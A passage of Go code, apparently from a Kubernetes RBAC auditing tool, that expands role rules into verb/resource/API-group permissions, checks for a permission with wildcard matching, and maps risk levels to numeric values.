	var perms []explodedPerm

	verbs := rule.Verbs
	resources := rule.Resources
	apiGroups := rule.APIGroups

	if len(verbs) == 0 {
		verbs = []string{"-"}
	}
	if len(resources) == 0 {
		resources = []string{"-"}
	}
	if len(apiGroups) == 0 {
		apiGroups = []string{"-"}
	}

	for _, verb := range verbs {
		for _, res := range resources {
			for _, group := range apiGroups {
				perms = append(perms, explodedPerm{
					Verb:     verb,
					Resource: res,
					APIGroup: group,
				})
			}
		}
	}

	return perms
}

func hasPermission(perms []PermissionFinding, verb, resource string) bool {
	for _, p := range perms {
		if (p.Verb == verb || p.Verb == "*") && (p.Resource == resource || p.Resource == "*" || resource == "") {
			return true
		}
	}
	return false
}

func permissionsRiskLevelValue(level string) int {
	return shared.RiskLevelValue(level)
}
